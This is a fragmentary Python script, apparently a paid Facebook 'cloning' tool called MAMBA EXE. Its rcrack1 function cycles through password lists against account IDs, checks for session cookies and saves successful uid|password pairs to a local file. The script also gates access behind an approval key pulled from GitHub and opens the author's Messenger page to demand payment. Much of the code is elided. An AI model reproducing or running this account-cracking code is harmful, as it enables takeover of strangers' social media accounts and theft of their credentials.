...
import os,base64
os.system("xdg-open https://www.facebook.com/MAMBAEXE69/?ref=share")
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/MambaExe/MAMBAHEROO/blob/main/Key.txt').text
		ua=open('.bbnew.txt','w')
...
--------------------------------------------------
[â€¢]\033[1;32mCREATED BY     : \033[1;32mAB MAMBA\033[1;32m
[â€¢]\033[1;32mFACEBOOK       : \033[1;32mAB MAMBA\033[1;32m
[â€¢]\033[1;32mYOUTUBE        : \033[1;32mGB MAMBA EXE\033[1;32m
[â€¢]\033[1;32mSTATUS         : \033[1;32M PREMIUM\033[1;32m
--------------------------------------------------
\033[1;32m[ðŸ”¥]MAMBA EXE
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://m.me/MAMBAEXE69');menu()
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [MAMBA-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/MAMBA-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print(f'\r\x1b[1;32m [MAMBA-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/MambaExe/MAMBAHEROO/blob/main/Key.txt').text
...
|  |/--\|  ||__)/--\ 
 ...
 \033[1;32m=================================================
\033[1;32m[+] AUTHOR    :\033[1;32m SANGAM ♤
\033[1;32m[+] GITHUB    :\033[1;32m MambaExe
\033[1;32m[+] YOUTUBE   :\033[1;32m MAMBA EXE
...
\033[1;32m=================================================
 ...
 \033[1;32m[2]You need to get approval to use this tool
 \033[1;32m[3]Money is everything 
================================================== 
 [*] File Cloning
 [*] Create File
 [*] Public Cloning
...
==================================================   """)
  ...
  os.system('xdg-open https://m.me/MAMBAEXE69')
  print("");time.sleep(2)
  print("\x1b[1;32m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/MambaExe/MAMBAHEROO/blob/main/Key.txt").text
    if id in httpCaht:
...
def tnx():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;32m    Sorry Bro Your Token not Aproved[PAISA TIR PAILLA] ")
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://m.me/MAMBAEXE69')
      time.sleep(2)
      sys.exit()
